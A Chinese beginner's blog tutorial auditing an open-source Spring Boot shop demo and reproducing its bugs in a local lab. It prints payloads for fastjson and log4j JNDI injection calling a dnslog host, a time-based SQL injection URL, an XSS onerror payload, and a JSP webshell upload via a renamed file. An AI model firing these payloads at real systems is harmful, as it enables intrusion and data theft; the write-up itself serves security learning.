@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>新手系列--迷你天猫商城系统代码审计流程 | Timind's café</title><meta name="author" content="Timind"><meta name="copyright" content="Timind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、项目介绍迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。 所有页面均兼容IE10及以上现代浏览器 本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新手系列--迷你天猫商城系统代码审计流程">
+<meta property="og:url" content="http://timind-sec.github.io/posts/8e2aa821/index.html">
+<meta property="og:site_name" content="Timind&#39;s café">
+<meta property="og:description" content="一、项目介绍迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。 所有页面均兼容IE10及以上现代浏览器 本">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://timind-sec.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-12-26T13:26:21.000Z">
+<meta property="article:modified_time" content="2025-12-26T16:28:40.397Z">
+<meta property="article:author" content="Timind">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://timind-sec.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "新手系列--迷你天猫商城系统代码审计流程",
+  "url": "http://timind-sec.github.io/posts/8e2aa821/",
+  "image": "http://timind-sec.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-12-26T13:26:21.000Z",
+  "dateModified": "2025-12-26T16:28:40.397Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Timind",
+      "url": "http://timind-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://timind-sec.github.io/posts/8e2aa821/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '新手系列--迷你天猫商城系统代码审计流程',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/url(https:/c-ssl.duitang.com/uploads/item/201902/27/20190227220253_hhrtf.jpg));"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">新手系列--迷你天猫商城系统代码审计流程</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">新手系列--迷你天猫商城系统代码审计流程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-26T13:26:21.000Z" title="发表于 2025-12-26 21:26:21">2025-12-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-26T16:28:40.397Z" title="更新于 2025-12-27 00:28:40">2025-12-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一、项目介绍"><a href="#一、项目介绍" class="headerlink" title="一、项目介绍"></a>一、项目介绍</h1><p>迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p>
+<p>所有页面均兼容IE10及以上现代浏览器</p>
+<p>本项目地址：<a target="_blank" rel="noopener" href="https://gitee.com/project_team/Tmall-demo/">https://gitee.com/project_team/Tmall-demo/</a></p>
+<h1 id="二、项目部署"><a href="#二、项目部署" class="headerlink" title="二、项目部署"></a>二、项目部署</h1><p>①该实验环境jdk版本为openjdk_8u65，java8即可，打开项目文件后，在pom.xml中使用maven clean清除缓存并导入依赖包。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226213425454.png" alt="image-20251226213425454"></p>
+<p>②然后数据库配置如下，在application.properties中修改你数据库对应的配置，并运行phpstudy的mysql服务，这里我选择的是MySQL5.7.26</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226213710308.png" alt="image-20251226213710308"></p>
+<p>③然后运行该springboot项目，访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8088/tmall/admin%EF%BC%8C%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E9%BB%98%E8%AE%A4%E4%B8%BAadmin/123456%E3%80%82">http://127.0.0.1:8088/tmall/admin，登录账号密码默认为admin/123456。</a></p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226213847486.png" alt="image-20251226213847486"></p>
+<p>登录后台如上即代表环境搭建成功。</p>
+<h1 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h1><p><strong>本项目是基于Maven构建的。</strong></p>
+<p><strong>对于Maven项目，我们首先从 pom.xml 文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点。</strong></p>
+<h4 id="1、组件审计–fastjson"><a href="#1、组件审计–fastjson" class="headerlink" title="1、组件审计–fastjson"></a>1、组件审计–fastjson</h4><p>观察pom.xml文件或者外部依赖库可发现该项目使用的是1.2.58的fastjson库，版本&lt;1.2.83，曾纰漏过存在远程代码执行漏洞，这里我们全局搜索，文件掩码选择Java，这里我们只看哪一个文件是Controller文件，因为xxxController是接受参数并进行处理的中间层，是我们外部可控的，所以优先考虑。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226222145108.png" alt="image-20251226222145108"></p>
+<p>全局搜索json.parseObject()，发现如下Controller有过引用。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226222217937.png" alt="image-20251226222217937"></p>
+<p>这里我们选择进入ProductController.java，发现这个propertyJson是我们前端用户传入的可控数据，所以该漏洞点可以作为后续的渗透测试的测试样本。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226222426055.png" alt="image-20251226222426055"></p>
+<p>除此之外我们也要关注这段代码里的中文信息，如“添加成功”，“整合产品信息”等也是我们后续黑盒测试时搜索接口信息的依据。</p>
+<h2 id="2、log4j远程代码执行漏洞"><a href="#2、log4j远程代码执行漏洞" class="headerlink" title="2、log4j远程代码执行漏洞"></a>2、log4j远程代码执行漏洞</h2><p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226222643235.png" alt="image-20251226222643235"></p>
+<p>pom.xml引入的log4j版本属于漏洞版本范畴，这里我们直接在项目中全局搜索logger.info，同样地，我们为了去找一个可控的点，依然选择控制器（Controller）类。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226223243883.png" alt="image-20251226223243883"></p>
+<p>可以看到有很多的logger.info，我们筛选出可控变量的logger.info()，这里我们进入到AccountController.java。</p>
+<p>①我们先看admin&#x2F;uploadAdminHeadImage路由：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226223441902.png" alt="image-20251226223441902"></p>
+<p>经过一系列调用之后，我们看到logger.info会对filePath进行处理，而其中的filePath又会包含fileName，而这个fileName正是我们可控的变量，也就是说我们可以在这个filePath注入恶意的执行代码实现rce。</p>
+<p>②再看admin&#x2F;account路由</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226223728705.png" alt="image-20251226223728705"></p>
+<p>但很可惜，这个adminId是checkAdmin生成的，根据代码逻辑并不能实现完全可控，遂放弃。读者可以自行尝试。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226223859429.png" alt="image-20251226223859429"></p>
+<p>所以综上，我们只找到了一个log4j的漏洞利用点，是上传特殊名字的文件即可执行恶意代码的漏洞。在后续渗透测试会进行演示。</p>
+<h2 id="3、任意文件上传漏洞"><a href="#3、任意文件上传漏洞" class="headerlink" title="3、任意文件上传漏洞"></a>3、任意文件上传漏洞</h2><p>在上面的log4j漏洞中其实可以很容易地发现，这个文件上传他是直接拼接而不经过任何安全校验的，比如后缀名之类的，所以存在任意文件上传漏洞，攻击者可以上传jsp木马文件，然后根据这个后端代码的路径可以判断我们木马的位置。</p>
+<p>但是在正常的项目代码审计中，我建议还是要规范的，先从全局搜索开始，搜索getOriginalFileName()等关键字，进入到控制器类再根据其对文件类型的判断其是否存在文件上传漏洞</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226225249789.png" alt="image-20251226225249789"></p>
+<p>可以看到这里就是没有做任何处理，导致任意文件上传。拼接url为<a target="_blank" rel="noopener" href="http://127.0.0.1:8088/tmall/res/images/item/userProfilePicture/UUID-filename">http://127.0.0.1:8088/tmall/res/images/item/userProfilePicture/UUID-filename</a></p>
+<p>后续渗透测试会进行演示。</p>
+<h2 id="4、不规范的mybatis写法导致sql注入漏洞"><a href="#4、不规范的mybatis写法导致sql注入漏洞" class="headerlink" title="4、不规范的mybatis写法导致sql注入漏洞"></a>4、不规范的mybatis写法导致sql注入漏洞</h2><p>审计项目时，mybatis也是关键的一环，我的习惯就是在mapper目录下搜索${，这种写法其实起源于程序员在测试的时候图方便，可以进行like模糊查询而创造的写法，但是这种写法不规范的话会导致sql注入漏洞，所以千万不可偷懒</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226225711883.png" alt="image-20251226225711883"></p>
+<p>在这里我们可以看到很多的xml都调用了这一个orderUtil.orderBy，跟进去看，先看第一个ProductMapper.xml。</p>
+<p>这里我们可以在idea里面装一个插件：<strong>Free MyBatis Tool</strong></p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226230155165.png" alt="image-20251226230155165"></p>
+<p>这个开源插件可以方便我们去根据mybatis的xml文件去溯源实际的dao文件，也就是xxxMapper.java，这类文件一般都定义好了各种sql语句的接口，然后需要在Service层实现（笔者贫瘠的大脑理解的是这样的&#x3D;皿&#x3D;）</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226230525265.png" alt="image-20251226230525265"></p>
+<p>装好这个插件就会像上图一样显示一个向左的绿色箭头，点击即可跟进到ProductOrderMapper.java。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226230621686.png" alt="image-20251226230621686"></p>
+<p>ctrl点击这个select（因为是经他传入oderUtil），然后跟进到ProductOrderServiceImpl.java文件的getList方法，这个就是重写了上述接口，然后我们再ctrl点击getList，看看又是哪个controller调用了他。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226230744954.png" alt="image-20251226230744954"></p>
+<p>点进去发现还是挺多的啊，但是实际上就是OrderController.java的第176行代码才是实现了可控变量的传入，是可利用的sql注入点</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226230957813.png" alt="image-20251226230957813"></p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226231129245.png" alt="image-20251226231129245"></p>
+<p>当然，该项目中类似的sql注入漏洞还有很多</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226231321826.png" alt="image-20251226231321826"></p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226231449223.png" alt="image-20251226231449223"></p>
+<p>都调用了getList方法，这里为了方便渗透测试，我们选择UserController，因为那个路由不用考虑太多因素（诸如index、count）即可传入sql注入语句，后续会进行演示。</p>
+<h2 id="5、XSS漏洞"><a href="#5、XSS漏洞" class="headerlink" title="5、XSS漏洞"></a>5、XSS漏洞</h2><p>这个就是看pom.xml的文件了。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226231705698.png" alt="image-20251226231705698"></p>
+<p><strong>漏洞解析：</strong></p>
+<p>由于使用了较老的JSP解析组件，JSP 默认行为是：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;param.name&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>或：</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= request.getParameter(<span class="string">&quot;name&quot;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>👉 <strong>不会做任何 HTML 转义</strong></p>
+<p>只要后端把用户输入原样传到 JSP：</p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="keyword">input</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>就直接触发 XSS。总而言之，其实就是由于不安全的组件导致html解析不安全，导致xss漏洞</p>
+<p>其次对本项目审计发现filter层并没有关于任何防护XSS的代码，如下图所示：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226232513068.png" alt="image-20251226232513068"></p>
+<p>发现filter层中并没有对用户输入的数据进行严格的校验（展示在前端的数据）</p>
+<p>所以后面我们可以根据一些jsp文件来针对性地传入一些恶意的JavaScript语句。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226232703884.png" alt="image-20251226232703884"></p>
+<p>比如这些，就可以作为xss的漏洞测试点。</p>
+<h2 id="三、渗透测试流程"><a href="#三、渗透测试流程" class="headerlink" title="三、渗透测试流程"></a>三、渗透测试流程</h2><h2 id="1、fastjson远程代码执行漏洞"><a href="#1、fastjson远程代码执行漏洞" class="headerlink" title="1、fastjson远程代码执行漏洞"></a>1、fastjson远程代码执行漏洞</h2><p>根据前面的回顾，猜测这个接口是添加产品的接口</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226232915607.png" alt="image-20251226232915607"></p>
+<p>添加产品后，我们填写产品信息并抓取数据包。然后我们在<a target="_blank" rel="noopener" href="http://www.dnslog.cn上申请一个域名,作为接受网站发送的dns请求的受体./">http://www.dnslog.cn上申请一个域名，作为接受网站发送的dns请求的受体。</a></p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226233140987.png" alt="image-20251226233140987"></p>
+<p>poc:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">propertyJson</span>=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;0euo9p.dnslog.cn&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226233252309.png" alt="image-20251226233252309"></p>
+<p>观察dns网站，发现接收到了dns请求，漏洞验证存在。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226233234321.png" alt="image-20251226233234321"></p>
+<h2 id="2、log4j远程代码执行漏洞-1"><a href="#2、log4j远程代码执行漏洞-1" class="headerlink" title="2、log4j远程代码执行漏洞"></a>2、log4j远程代码执行漏洞</h2><p>根据路由名称也能猜出来他是上传头像图片的地方。</p>
+<p>且由代码审计可知，我们是通过修改文件名来进行代码执行的，这里我们就在头像上传的地方抓取数据包，然后再在filename处修改参数值，注入恶意的代码。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226233922626.png" alt="image-20251226233922626"></p>
+<p>poc:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;<span class="variable">$&#123;jndi:ldap://s5n0te.dnslog.cn&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251226233942878.png" alt="image-20251226233942878"></p>
+<p>接受到了dns请求，漏洞验证成功。</p>
+<p><strong>补充：这里可以尝试使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具来实现rce</strong></p>
+<p>Java版本还是 1.8.0_65 。<strong>注意：</strong>要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用，然后本地地址也不能被使用，所以可以在虚拟机进行操作，这里感兴趣的可自行尝试。</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227002338540.png" alt="image-20251227002338540"></p>
+<p>选择合适的poc，版本要对上，这里我们是使用jdk1.8部署的，那就选择第一个链子，其他情况也得多加考虑。</p>
+<p>如果实在拿捏不准，大不了几个都试试。复制第三个攻击链接，将其粘贴到头像上传数据包中的filename处即可</p>
+<h2 id="3、任意文件上传漏洞-1"><a href="#3、任意文件上传漏洞-1" class="headerlink" title="3、任意文件上传漏洞"></a>3、任意文件上传漏洞</h2><p>还是同样的接口，但是是不一样的渗透思路，上传一张图片后改掉后缀，改成jsp文件。先用哥斯拉生成一个jsp文件，改成png文件再上传，再在burp中改后缀为jsp文件（前端校验但后端不校验）</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227000229114.png" alt="image-20251227000229114"></p>
+<p><strong>注意：一定要是先上传png再在burp中改成jsp文件</strong></p>
+<p>然后再根据之前的代码审计步骤，可以知道这个fileName是拼接在特定url后面的，也就是</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> filePath = session.<span class="built_in">getServletContext</span>().<span class="built_in">getRealPath</span>(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;res/images/item/adminProfilePicture/&quot;</span> + fileName;</span><br></pre></td></tr></table></figure>
+
+<p>根目录加上&#x2F;res&#x2F;images&#x2F;item&#x2F;adminProfilePicture&#x2F;才是上传文件的真实目录，所以我们将返回的文件名进行路径拼接，并用哥斯拉接管webshell：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227000535329.png" alt="image-20251227000535329"></p>
+<p>成功连接，拼接url为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1:8088</span>/tmall//res/images/item/adminProfilePicture/<span class="number">2</span>d4d55b9-<span class="number">69</span>a8-<span class="number">451</span>f-ab92-<span class="number">053</span>e8d18fd56.jsp</span><br></pre></td></tr></table></figure>
+
+<p>成功验证了任意文件上传漏洞。</p>
+<h2 id="4、不规范的mybatis写法导致sql注入漏洞-1"><a href="#4、不规范的mybatis写法导致sql注入漏洞-1" class="headerlink" title="4、不规范的mybatis写法导致sql注入漏洞"></a>4、不规范的mybatis写法导致sql注入漏洞</h2><p>从代码审计处，我们发现了存在SQL注入的漏洞功能点 用户管理-点击下一页按钮 ，会向后端发送查询数据</p>
+<p>包，其中存在漏洞参数 orderBy 。</p>
+<p>现在，我们从渗透测试角度，对该漏洞进行验证。</p>
+<p>首先，我们访问该功能，再点击下一页的时候，使用BurpSuite抓取数据包，如下图所示：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227000811551.png" alt="image-20251227000811551"></p>
+<p>复制数据包到request.txt并使用sqlmap来验证，结果确实可以实现sql注入</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd:<span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -r request.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227000911624.png" alt="image-20251227000911624"></p>
+<p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.56.1:8088</span>/tmall/admin/user/<span class="number">0</span>/<span class="number">10</span>?user_name=<span class="number">123</span>&amp;user_gender_array=<span class="number">0</span>&amp;user_gender_array=<span class="number">1</span>&amp;orderBy=<span class="number">1</span> AND (SELECT <span class="number">9233</span> FROM (SELECT(SLEEP(<span class="number">5</span>)))qYVl)&amp;isDesc=true</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、XSS漏洞-1"><a href="#5、XSS漏洞-1" class="headerlink" title="5、XSS漏洞"></a>5、XSS漏洞</h2><p><strong>管理后台</strong> <strong>-</strong> <strong>我的账户</strong> <strong>-</strong> <strong>管理员昵称处存在XSS漏洞。</strong></p>
+<p>访问上述功能，在管理员昵称处键入XSS漏洞验证POC，</p>
+ <img src="/.io//1" onerror="alert(1)"> 
+
+<p>，点击保存。如下图所示：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227001154928.png" alt="image-20251227001154928"></p>
+<p>触发XSS弹框，如下图所示：</p>
+<p><img src="/.io//pentest-notes\blog\blog\source_posts\新手系列--迷你天猫商城系统代码审计流程.assets\image-20251227001207147.png" alt="image-20251227001207147"></p>
+<p>其他地方，大家自由发挥。</p>
+<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>本期文章只做代码审计和漏洞复现工作，很多诸如fastjson反序列化漏洞，log4j远程代码执行漏洞的原理并没有做过多深度探索，读者有兴趣可以在网上搜索关键字进行原理上的学习，笔者的能力有限，希望日后能更新更高质量的文章QWQ</p>
+<p>参考链接：[JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计_java代码审计 硬编码漏洞实战-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Power7089/article/details/126462225#:~:text=%E6%9C%AC%E6%96%87%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%AF%B9%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%87%E7%A8%8B%EF%BC%8C%E9%87%8D%E7%82%B9%E8%81%9A%E7%84%A6%E4%BA%8ELog4j2shell%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%82,%E6%96%87%E7%AB%A0%E8%AF%A6%E7%BB%86%E9%98%90%E8%BF%B0%E4%BA%86%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E3%80%81%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E3%80%81%E7%89%B9%E5%88%AB%E6%98%AFFastjson%E3%80%81Log4j%E5%92%8CMybatis%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E8%BF%99%E4%BA%9B%E6%BC%8F%E6%B4%9E%E3%80%82">https://blog.csdn.net/Power7089/article/details/126462225#:~:text=本文介绍了对迷你天猫商城的代码审计过程，重